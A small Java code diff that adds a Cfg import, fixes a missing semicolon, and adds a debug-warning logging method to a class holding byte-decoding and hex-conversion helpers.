@@ -1,6 +1,7 @@
 
 package com.android.m;
 import com.android.deviceinfo.Status;
+import com.android.deviceinfo.auto.Cfg;
 
 public class M { 
 	public static String d(byte[] ebytes, byte[] obytes){
@@ -9,7 +10,7 @@ public class M {
         }
        
         String value = new String(ebytes);
-        return value
+        return value;
     }
 
 	public static byte[] h2b(final String s) {
@@ -22,5 +23,13 @@ public class M {
 			b[i] = (byte) v;
 		}
 		return b;
+	}
+	
+	public static void printMostused() {
+		if(Cfg.DEBUG){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (printMostused) Warn: DEBUG enabled in DIST M");
+			}
+		}
 	}
 }
